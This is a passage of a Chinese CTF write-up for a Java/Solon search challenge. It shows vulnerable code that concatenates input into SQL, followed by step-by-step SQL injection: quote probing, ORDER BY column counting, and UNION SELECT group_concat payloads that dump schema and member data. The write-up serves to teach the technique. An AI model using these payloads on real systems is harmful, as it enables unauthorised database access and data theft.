+<p>就是直接在浏览器输入时，会再url加密一次</p>
+<p>所以要抓包改 防止重复加密</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206121445472.png" srcset="/img/loading.gif" lazyload alt="image-20240206121445472"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206121516661.png" srcset="/img/loading.gif" lazyload alt="image-20240206121516661"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206121554602.png" srcset="/img/loading.gif" lazyload alt="image-20240206121554602"></p>
+<h6 id="search4member-没做出来">search4member[没做出来]</h6>
+<p>看到这个题</p>
+<p>我就感觉像sql</p>
+<p>审阅了一下源码</p>
+<p>肯定是sql</p>
+<p>有用的文件就这几个，其它都不是核心主逻辑</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206193639563.png" srcset="/img/loading.gif" lazyload alt="image-20240206193639563"></p>
+<p>只不过后端是java写的</p>
+<p>一个一个看</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">App.java<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    Solon.start(App.class, args);<br><br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>您提供的代码片段是一个Java程序的入口点，它使用了<code>Solon.start(App.class, args);</code>这行代码。这表明您可能在使用Solon框架，一个轻量级的Java微服务框架，用于快速开发和部署微服务应用。</p>
+<p>Solon框架设计思想是简洁而不简单，旨在通过减少配置和依赖，使得开发人员能够更专注于业务逻辑的实现。它支持多种服务协议，包括HTTP、WebSocket等，并且可以很方便地与其他服务或组件进行集成。</p>
+<p>在您的代码中：</p>
+<ol>
+<li><code>public class App</code>定义了一个名为<code>App</code>的类，这是Java程序的标准做法。</li>
+<li><code>public static void main(String[] args)</code>方法是Java程序的主入口点。任何一个Java程序都是从<code>main</code>方法开始执行的。</li>
+<li><code>Solon.start(App.class, args);</code>这行代码启动了Solon框架，并将当前类<code>App</code>作为启动点。<code>args</code>参数用于传递命令行参数给程序。</li>
+</ol>
+<p>java程序的框架配置入口</p>
+<p>看下一个文件controller</p>
+<p>这个应该就是主要控制逻辑了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SearchController</span> &#123;<br>    <span class="hljs-meta">@Inject</span><br>    <span class="hljs-keyword">private</span> DbManager dbManager;<br>    <span class="hljs-meta">@Mapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-meta">@Param(defaultValue = &quot;web&quot;)</span> String keyword)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        List&lt;String&gt; results = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        <span class="hljs-keyword">if</span> (keyword != <span class="hljs-literal">null</span> &amp; !keyword.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM member WHERE intro LIKE &#x27;%&quot;</span> + keyword + <span class="hljs-string">&quot;%&#x27;;&quot;</span>;<br>            <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> dbManager.getDataSource();<br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> dataSource.getConnection().createStatement();<br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery(sql);<br>            <span class="hljs-keyword">while</span> (resultSet.next()) &#123;<br>                results.add(resultSet.getString(<span class="hljs-string">&quot;id&quot;</span>) + <span class="hljs-string">&quot; : &quot;</span><br>                        + resultSet.getString(<span class="hljs-string">&quot;intro&quot;</span>) + <span class="hljs-string">&quot; : &quot;</span><br>                        + resultSet.getString(<span class="hljs-string">&quot;blog&quot;</span>));<br>            &#125;<br>            resultSet.close();<br>            statement.close();<br>        &#125;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;search.ftl&quot;</span>);<br>        model.put(<span class="hljs-string">&quot;results&quot;</span>, results);<br>        <span class="hljs-keyword">return</span> model;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>有用的就一句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">if (keyword <span class="hljs-operator">!=</span> <span class="hljs-keyword">null</span> <span class="hljs-operator">&amp;</span> <span class="hljs-operator">!</span>keyword.equals(&quot;&quot;)) &#123;<br>    String <span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;SELECT * FROM member WHERE intro LIKE &#x27;%&quot; <span class="hljs-operator">+</span> keyword <span class="hljs-operator">+</span> &quot;%&#x27;;&quot;;<br></code></pre></td></tr></table></figure>
+<p>在您提供的代码中，<code>SearchController</code>类是一个使用Solon框架构建的控制器，用于处理搜索请求并返回搜索结果。这个类展示了如何在Solon框架中使用注解定义控制器、注入依赖以及处理HTTP请求。然而，代码中也存在一些需要改进的地方，特别是在数据库查询和安全性方面。</p>
+<p>主要代码分析</p>
+<ol>
+<li><strong>@Controller注解</strong>：标记这是一个控制器类，用于处理Web请求。</li>
+<li><strong>@Inject注解</strong>：用于依赖注入，这里注入了<code>DbManager</code>，一个假定的数据库管理类。</li>
+<li><strong>@Mapping注解</strong>：指定该方法处理的路由（在这个例子中是根路径<code>&quot;/&quot;</code>）。当访问根URL时，会调用此方法。</li>
+<li><strong>关键字搜索</strong>：方法<code>search</code>接收一个名为<code>keyword</code>的参数，用于数据库搜索。如果<code>keyword</code>不为空，就执行一个SQL查询，搜索<code>member</code>表中<code>intro</code>字段包含关键字的记录。</li>
+<li><strong>ModelAndView</strong>：创建一个<code>ModelAndView</code>对象，指定视图名称（在这个例子中是<code>search.ftl</code>Freemarker模板）并传递搜索结果。</li>
+</ol>
+<p>看下一个</p>
+<p>init sql就导入了一下数据</p>
+<p>再看database</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DbManager</span> &#123;<br>  <span class="hljs-meta">@Inject(&quot;$&#123;project.home&#125;&quot;)</span><br>  <span class="hljs-keyword">public</span> String home;<br>  DataSource dataSource;<br>  <span class="hljs-meta">@Init</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException, FileNotFoundException &#123;<br>    <span class="hljs-type">HikariConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HikariConfig</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">dbPath</span> <span class="hljs-operator">=</span> home + <span class="hljs-string">&quot;h2&quot;</span>;<br>    config.setJdbcUrl((<span class="hljs-string">&quot;jdbc:h2:&quot;</span> + dbPath));<br>    config.setUsername(<span class="hljs-string">&quot;username&quot;</span>);<br>    config.setPassword(<span class="hljs-string">&quot;password&quot;</span>);<br>    dataSource = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HikariDataSource</span>(config);<br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> dataSource.getConnection();<br>RunScript.execute(connection, <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(home+<span class="hljs-string">&quot;init.sql&quot;</span>));<br>  connection.close();<br>  &#125;<br>  <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">getDataSource</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-keyword">return</span> dataSource;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>您提供的<code>DbManager</code>类是一个使用Solon框架构建的组件，它负责数据库连接池的配置和初始化。这个类演示了如何在Solon框架中使用注解定义组件、注入配置属性以及初始化资源。此外，它使用HikariCP作为连接池，这是一个性能非常优秀的数据库连接池库。下面是对该类的一些分析和建议：</p>
+<p>主要代码分析</p>
+<ol>
+<li><strong>@Component注解</strong>：表示这个类是一个组件，Solon容器会自动实例化并管理它。</li>
+<li><strong>@Inject注解</strong>：用于注入配置属性。这里将<code>project.home</code>配置属性注入到<code>home</code>变量中。这表明<code>project.home</code>需要在应用的配置文件中定义。</li>
+<li><strong>DataSource</strong>：<code>dataSource</code>变量被用来存储数据库连接池的引用。</li>
+<li><strong>@Init注解</strong>：标记<code>init</code>方法作为初始化方法，这个方法会在组件创建后自动调用。<code>init</code>方法配置HikariCP连接池，并执行一个初始化SQL脚本。</li>
+<li><strong>数据库路径和初始化</strong>：数据库的路径是基于<code>project.home</code>配置动态构建的。这增加了灵活性，使得数据库的位置可以通过配置控制。使用<code>RunScript.execute</code>执行<code>init.sql</code>脚本来初始化数据库，这是一个很好的实践，可以用来创建表、插入初始数据等。</li>
+</ol>
+<p>没什么有用的东西，就看一句话想想怎么注就行</p>
+<p>String sql = “SELECT * FROM member WHERE intro LIKE '%” + keyword + “%';”;</p>
+<p>直接拼接上去了</p>
+<p>从intro字段里查询有keyword的member</p>
+<p>尝试注入</p>
+<p>应该会有过滤吧sql题</p>
+<p>先开burp fuzz一下</p>
+<p>不行</p>
+<p>池子太小</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206220250253.png" srcset="/img/loading.gif" lazyload alt="image-20240206220250253"></p>
+<p>输入&quot; 无回显</p>
+<p>输入’ 直接报错白屏</p>
+<p>说明是单引号闭合</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206220414097.png" srcset="/img/loading.gif" lazyload alt="image-20240206220414097"></p>
+<p>#无效</p>
+<p>– 注释成功</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206220458686.png" srcset="/img/loading.gif" lazyload alt="image-20240206220458686"></p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206221705579.png" srcset="/img/loading.gif" lazyload alt="image-20240206221705579"></p>
+<p>web’ order by 3 –</p>
+<p>无回显</p>
+<p>by 4</p>
+<p>白屏</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206221924271.png" srcset="/img/loading.gif" lazyload alt="image-20240206221924271"></p>
+<p>因此字段数为3</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206224145351.png" srcset="/img/loading.gif" lazyload alt="image-20240206224145351"></p>
+<p>union直接打吧</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206225249995.png" srcset="/img/loading.gif" lazyload alt="image-20240206225249995"></p>
+<p>经过测试可以用的回显位是1，2</p>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206225527362.png" srcset="/img/loading.gif" lazyload alt="image-20240206225527362"></p>
+<p><em><strong>都多余了</strong></em></p>
+<ul>
+<li>INFORMATION_SCHEMA,PUBLIC : 2 : 3</li>
+</ul>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206225624318.png" srcset="/img/loading.gif" lazyload alt="image-20240206225624318"></p>
+<p>group_concat</p>
+<p>爆表</p>
+<ul>
+<li>ENUM_VALUES,CONSTANTS,SEQUENCES,RIGHTS,TRIGGERS,SETTINGS,VIEWS,INFORMATION_SCHEMA_CATALOG_NAME,ROUTINES,COLUMNS,KEY_COLUMN_USAGE,LOCKS,DOMAINS,COLUMN_PRIVILEGES,SCHEMATA,FIELDS,CONSTRAINT_COLUMN_USAGE,SESSION_STATE,REFERENTIAL_CONSTRAINTS,TABLE_PRIVILEGES,PARAMETERS,TABLES,ELEMENT_TYPES,QUERY_STATISTICS,INDEX_COLUMNS,ROLES,CHECK_CONSTRAINTS,SESSIONS,IN_DOUBT,COLLATIONS,DOMAIN_CONSTRAINTS,SYNONYMS,USERS,TABLE_CONSTRAINTS,INDEXES,           MEMBER</li>
+</ul>
+<p><strong><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206230137020.png" srcset="/img/loading.gif" lazyload alt="image-20240206230137020"></strong></p>
+<p>爆列</p>
+<ul>
+<li>OBJECT_CATALOG,OBJECT_SCHEMA,OBJECT_NAME,OBJECT_TYPE,ENUM_IDENTIFIER,VALUE_NAME,VALUE_ORDINAL,CONSTANT_CATALOG,CONSTANT_SCHEMA,CONSTANT_NAME,VALUE_DEFINITION,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,CHARACTER_SET_CATALOG,CHARACTER_SET_SCHEMA,CHARACTER_SET_NAME,COLLATION_CATALOG,COLLATION_SCHEMA,COLLATION_NAME,NUMERIC_PRECISION,NUMERIC_PRECISION_RADIX,NUMERIC_SCALE,DATETIME_PRECISION,INTERVAL_TYPE,INTERVAL_PRECISION,MAXIMUM_CARDINALITY,DTD_IDENTIFIER,DECLARED_DATA_TYPE,DECLARED_NUMERIC_PRECISION,DECLARED_NUMERIC_SCALE,GEOMETRY_TYPE,GEOMETRY_SRID,REMARKS,SEQUENCE_CATALOG,SEQUENCE_SCHEMA,SEQUENCE_NAME,DATA_TYPE,NUMERIC_PRECISION,NUMERIC_PRECISION_RADIX,NUMERIC_SCALE,START_VALUE,MINIMUM_VALUE,MAXIMUM_VALUE,INCREMENT,CYCLE_OPTION,DECLARED_DATA_TYPE,DECLARED_NUMERIC_PRECISION,DECLARED_NUMERIC_SCALE,BASE_VALUE,CACHE,REMARKS,GRANTEE,GRANTEETYPE,GRANTEDROLE,RIGHTS,TABLE_SCHEMA,TABLE_NAME,TRIGGER_CATALOG,TRIGGER_SCHEMA,TRIGGER_NAME,EVENT_MANIPULATION,EVENT_OBJECT_CATALOG,EVENT_OBJECT_SCHEMA,EVENT_OBJECT_TABLE,ACTION_ORIENTATION,ACTION_TIMING,IS_ROLLBACK,JAVA_CLASS,QUEUE_SIZE,NO_WAIT,REMARKS,SETTING_NAME,SETTING_VALUE,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,VIEW_DEFINITION,CHECK_OPTION,IS_UPDATABLE,INSERTABLE_INTO,IS_TRIGGER_UPDATABLE,IS_TRIGGER_DELETABLE,IS_TRIGGER_INSERTABLE_INTO,STATUS,REMARKS,CATALOG_NAME,SPECIFIC_CATALOG,SPECIFIC_SCHEMA,SPECIFIC_NAME,ROUTINE_CATALOG,ROUTINE_SCHEMA,ROUTINE_NAME,ROUTINE_TYPE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,CHARACTER_SET_CATALOG,CHARACTER_SET_SCHEMA,CHARACTER_SET_NAME,COLLATION_CATALOG,COLLATION_SCHEMA,COLLATION_NAME,NUMERIC_PRECISION,NUMERIC_PRECISION_RADIX,NUMERIC_SCALE,DATETIME_PRECISION,INTERVAL_TYPE,INTERVAL_PRECISION,MAXIMUM_CARDINALITY,DTD_IDENTIFIER,ROUTINE_BODY,ROUTINE_DEFINITION,EXTERNAL_NAME,EXTERNAL_LANGUAGE,PARAMETER_STYLE,IS_DETERMINISTIC,DECLARED_DATA_TYPE,DECLARED_NUMERIC_PRECISION,DECLARED_NUMERIC_SCALE,GEOMETRY_TYPE,GEOMETRY_SRID,REMARKS,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_PRECISION_RADIX,NUMERIC_SCALE,DATETIME_PRECISION,INTERVAL_TYPE,INTERVAL_PRECISION,CHARACTER_SET_CATALOG,CHARACTER_SET_SCHEMA,CHARACTER_SET_NAME,COLLATION_CATALOG,COLLATION_SCHEMA,COLLATION_NAME,DOMAIN_CATALOG,DOMAIN_SCHEMA,DOMAIN_NAME,MAXIMUM_CARDINALITY,DTD_IDENTIFIER,IS_IDENTITY,IDENTITY_GENERATION,IDENTITY_START,IDENTITY_INCREMENT,IDENTITY_MAXIMUM,IDENTITY_MINIMUM,IDENTITY_CYCLE,IS_GENERATED,GENERATION_EXPRESSION,DECLARED_DATA_TYPE,DECLARED_NUMERIC_PRECISION,DECLARED_NUMERIC_SCALE,GEOMETRY_TYPE,GEOMETRY_SRID,IDENTITY_BASE,IDENTITY_CACHE,COLUMN_ON_UPDATE,IS_VISIBLE,DEFAULT_ON_NULL,SELECTIVITY,REMARKS,CONSTRAINT_CATALOG,CONSTRAINT_SCHEMA,CONSTRAINT_NAME,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ORDINAL_POSITION,POSITION_IN_UNIQUE_CONSTRAINT,TABLE_SCHEMA,TABLE_NAME,SESSION_ID,LOCK_TYPE,DOMAIN_CATALOG,DOMAIN_SCHEMA,DOMAIN_NAME,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,CHARACTER_SET_CATALOG,CHARACTER_SET_SCHEMA,CHARACTER_SET_NAME,COLLATION_CATALOG,COLLATION_SCHEMA,COLLATION_NAME,NUMERIC_PRECISION,NUMERIC_PRECISION_RADIX,NUMERIC_SCALE,DATETIME_PRECISION,INTERVAL_TYPE,INTERVAL_PRECISION,DOMAIN_DEFAULT,MAXIMUM_CARDINALITY,DTD_IDENTIFIER,DECLARED_DATA_TYPE,DECLARED_NUMERIC_PRECISION,DECLARED_NUMERIC_SCALE,GEOMETRY_TYPE,GEOMETRY_SRID,DOMAIN_ON_UPDATE,PARENT_DOMAIN_CATALOG,PARENT_DOMAIN_SCHEMA,PARENT_DOMAIN_NAME,REMARKS,GRANTOR,GRANTEE,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,PRIVILEGE_TYPE,IS_GRANTABLE,CATALOG_NAME,SCHEMA_NAME,SCHEMA_OWNER,DEFAULT_CHARACTER_SET_CATALOG,DEFAULT_CHARACTER_SET_SCHEMA,DEFAULT_CHARACTER_SET_NAME,SQL_PATH,DEFAULT_COLLATION_NAME,REMARKS,OBJECT_CATALOG,OBJECT_SCHEMA,OBJECT_NAME,OBJECT_TYPE,ROW_IDENTIFIER,FIELD_NAME,ORDINAL_POSITION,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,CHARACTER_SET_CATALOG,CHARACTER_SET_SCHEMA,CHARACTER_SET_NAME,COLLATION_CATALOG,COLLATION_SCHEMA,COLLATION_NAME,NUMERIC_PRECISION,NUMERIC_PRECISION_RADIX,NUMERIC_SCALE,DATETIME_PRECISION,INTERVAL_TYPE,INTERVAL_PRECISION,MAXIMUM_CARDINALITY,DTD_IDENTIFIER,DECLARED_DATA_TYPE,DECLARED_NUMERIC_PRECISION,DECLARED_NUMERIC_SCALE,GEOMETRY_TYPE,GEOMETRY_SRID,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,CONSTRAINT_CATALOG,CONSTRAINT_SCHEMA,CONSTRAINT_NAME,STATE_KEY,STATE_COMMAND,CONSTRAINT_CATALOG,CONSTRAINT_SCHEMA,CONSTRAINT_NAME,UNIQUE_CONSTRAINT_CATALOG,UNIQUE_CONSTRAINT_SCHEMA,UNIQUE_CONSTRAINT_NAME,MATCH_OPTION,UPDATE_RULE,DELETE_RULE,GRANTOR,GRANTEE,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,PRIVILEGE_TYPE,IS_GRANTABLE,WITH_HIERARCHY,SPECIFIC_CATALOG,SPECIFIC_SCHEMA,SPECIFIC_NAME,ORDINAL_POSITION,PARAMETER_MODE,IS_RESULT,AS_LOCATOR,PARAMETER_NAME,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,CHARACTER_SET_CATALOG,CHARACTER_SET_SCHEMA,CHARACTER_SET_NAME,COLLATION_CATALOG,COLLATION_SCHEMA,COLLATION_NAME,NUMERIC_PRECISION,NUMERIC_PRECISION_RADIX,NUMERIC_SCALE,DATETIME_PRECISION,INTERVAL_TYPE,INTERVAL_PRECISION,MAXIMUM_CARDINALITY,DTD_IDENTIFIER,DECLARED_DATA_TYPE,DECLARED_NUMERIC_PRECISION,DECLARED_NUMERIC_SCALE,PARAMETER_DEFAULT,GEOMETRY_TYPE,GEOMETRY_SRID,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,TABLE_TYPE,IS_INSERTABLE_INTO,COMMIT_ACTION,STORAGE_TYPE,REMARKS,LAST_MODIFICATION,TABLE_CLASS,ROW_COUNT_ESTIMATE,OBJECT_CATALOG,OBJECT_SCHEMA,OBJECT_NAME,OBJECT_TYPE,COLLECTION_TYPE_IDENTIFIER,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,CHARACTER_SET_CATALOG,CHARACTER_SET_SCHEMA,CHARACTER_SET_NAME,COLLATION_CATALOG,COLLATION_SCHEMA,COLLATION_NAME,NUMERIC_PRECISION,NUMERIC_PRECISION_RADIX,NUMERIC_SCALE,DATETIME_PRECISION,INTERVAL_TYPE,INTERVAL_PRECISION,MAXIMUM_CARDINALITY,DTD_IDENTIFIER,DECLARED_DATA_TYPE,DECLARED_NUMERIC_PRECISION,DECLARED_NUMERIC_SCALE,GEOMETRY_TYPE,GEOMETRY_SRID,SQL_STATEMENT,EXECUTION_COUNT,MIN_EXECUTION_TIME,MAX_EXECUTION_TIME,CUMULATIVE_EXECUTION_TIME,AVERAGE_EXECUTION_TIME,STD_DEV_EXECUTION_TIME,MIN_ROW_COUNT,MAX_ROW_COUNT,CUMULATIVE_ROW_COUNT,AVERAGE_ROW_COUNT,STD_DEV_ROW_COUNT,INDEX_CATALOG,INDEX_SCHEMA,INDEX_NAME,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ORDINAL_POSITION,ORDERING_SPECIFICATION,NULL_ORDERING,IS_UNIQUE,ROLE_NAME,REMARKS,CONSTRAINT_CATALOG,CONSTRAINT_SCHEMA,CONSTRAINT_NAME,CHECK_CLAUSE,SESSION_ID,USER_NAME,SERVER,CLIENT_ADDR,CLIENT_INFO,SESSION_START,ISOLATION_LEVEL,EXECUTING_STATEMENT,EXECUTING_STATEMENT_START,CONTAINS_UNCOMMITTED,SESSION_STATE,BLOCKER_ID,SLEEP_SINCE,TRANSACTION_NAME,TRANSACTION_STATE,COLLATION_CATALOG,COLLATION_SCHEMA,COLLATION_NAME,PAD_ATTRIBUTE,LANGUAGE_TAG,CONSTRAINT_CATALOG,CONSTRAINT_SCHEMA,CONSTRAINT_NAME,DOMAIN_CATALOG,DOMAIN_SCHEMA,DOMAIN_NAME,IS_DEFERRABLE,INITIALLY_DEFERRED,REMARKS,SYNONYM_CATALOG,SYNONYM_SCHEMA,SYNONYM_NAME,SYNONYM_FOR,SYNONYM_FOR_SCHEMA,TYPE_NAME,STATUS,REMARKS,USER_NAME,IS_ADMIN,REMARKS,CONSTRAINT_CATALOG,CONSTRAINT_SCHEMA,CONSTRAINT_NAME,CONSTRAINT_TYPE,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,IS_DEFERRABLE,INITIALLY_DEFERRED,ENFORCED,NULLS_DISTINCT,INDEX_CATALOG,INDEX_SCHEMA,INDEX_NAME,REMARKS,INDEX_CATALOG,INDEX_SCHEMA,INDEX_NAME,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,INDEX_TYPE_NAME,NULLS_DISTINCT,IS_GENERATED,REMARKS,INDEX_CLASS,              ID,INTRO,BLOG             : 2 : 3
+<ul>
+<li>​            																^^^^^^^^^^^</li>
+</ul>
+</li>
+</ul>
+<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240206231002480.png" srcset="/img/loading.gif" lazyload alt="image-20240206231002480"></p>
+<p>-1’ union select group_concat(table_name),2,3 from information_schema.tables where table_schema=‘INFORMATION_SCHEMA’ –</p>
+<ul>
+<li>ENUM_VALUES,CONSTANTS,SEQUENCES,RIGHTS,TRIGGERS,SETTINGS,VIEWS,INFORMATION_SCHEMA_CATALOG_NAME,ROUTINES,COLUMNS,KEY_COLUMN_USAGE,LOCKS,DOMAINS,COLUMN_PRIVILEGES,SCHEMATA,FIELDS,CONSTRAINT_COLUMN_USAGE,SESSION_STATE,REFERENTIAL_CONSTRAINTS,TABLE_PRIVILEGES,PARAMETERS,TABLES,ELEMENT_TYPES,QUERY_STATISTICS,INDEX_COLUMNS,ROLES,CHECK_CONSTRAINTS,SESSIONS,IN_DOUBT,COLLATIONS,DOMAIN_CONSTRAINTS,SYNONYMS,USERS,TABLE_CONSTRAINTS,INDEXES : 2 : 3</li>
+<li>没有MEMBER，在另一个库</li>
+<li>-1’ union select group_concat(table_name),2,3 from information_schema.tables where table_schema=‘PUBLIC’ –</li>
+<li>MEMBER</li>
+</ul>
+<p>爆数据</p>
+<p>​        -1’ union select group_concat(ID),2,3 from MEMBER –</p>
+<p>result</p>
+<ul>
+<li>0wl,0x4qE,1ue,357,4ctue,4nsw3r,A1ex,ACce1er4t0r,Ac4ae0,Acaleph,Ahlaman,Airbasic,Akira,Aklis,Annevi,Aris,Ash,At0m,BaiMeow,BrownFly,Ch1p,Ch405,ChenMoFeiJin,Cosmos,Cyris,Doddy,E99p1ant,Edward_L,Eric,Explorer,Gamison,Hcamael,HeartSky,Junier,Kevin,Klrin,Li4n0,Liki4,LoRexxar,Lou00,LuckyCat,LurkNoi,Mezone,MiGo,Michael,Minygd,Moesang,NeverMoes,ObjectNotFound,Potat0,Processor,R1esbyfe,R3n0,RT,Roam,Roc826,Seadom,Sora,Spine,Summer,Sysorem,Tata,Tinmix,Trotsky,Undefinedv,Y,Yotubird,b0lv42,ba1van4,bigmud,c014,chuj,ckj123,crumbling,d1gg12,daidr,ek1ng,f1rry,fantasyqt,feifei,ff1y,h4kuy4,hsiaoxychen,jibo,kabuto,l0tus,latt1ce,lightless,logong,lostflower,m140,ma1n,ma5hr00m,matrixtang,mian,ngc7293,qz,r4u,ripple,t0hka,tr0uble,veritas501,vvv_347,wenzhuan,xi4oyu,xiaoyao52110,yolande,幼稚园,彼岸,简,迟原静,逆风,陈斩仙 : 2 : 3</li>
+</ul>
+<p>​</p>
+<p>result</p>
+<ul>
